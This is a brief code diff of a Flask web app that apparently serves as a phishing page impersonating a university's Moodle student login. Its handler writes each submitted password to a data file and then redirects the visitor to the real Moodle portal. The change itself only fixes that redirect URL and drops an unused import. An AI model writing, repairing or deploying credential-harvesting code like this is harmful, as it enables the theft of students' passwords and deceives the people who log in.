@@ -1,6 +1,4 @@
 from flask import Flask, redirect, render_template, request, send_file
-from sqlalchemy import null
-
 
 app = Flask(__name__)
 
@@ -21,7 +19,7 @@ def main():
             data.write(password)
             data.write('\n')
         
-        return redirect('moodle.smuc.edu.et/students/')
+        return redirect('http://moodle.smuc.edu.et/students/')
 
 @app.route("/random")
 def random():
